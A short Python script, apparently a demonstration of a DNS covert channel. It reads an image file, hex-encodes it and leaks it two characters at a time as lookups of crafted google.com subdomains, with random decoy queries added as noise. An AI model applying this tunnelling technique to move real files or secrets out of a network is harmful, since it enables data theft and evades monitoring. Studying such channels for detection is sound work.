import socket
import random

f = open('QRcode.bmp', 'rb')
payload = f.read();
f.close();

message = '\S' + payload + '\E'
message = message.encode('hex')
print(message)

for b in range(0, len(message), 2):
    send = 'a' + 'EF' + message[b] + message[b+1] + '.google.com'
    print(send)
    # inject 0 to 3 amounts of noise into the pipe
    for i in range(random.randint(0, 3)):
        socket.gethostbyname("google.com")
    addr = socket.gethostbyname(send)
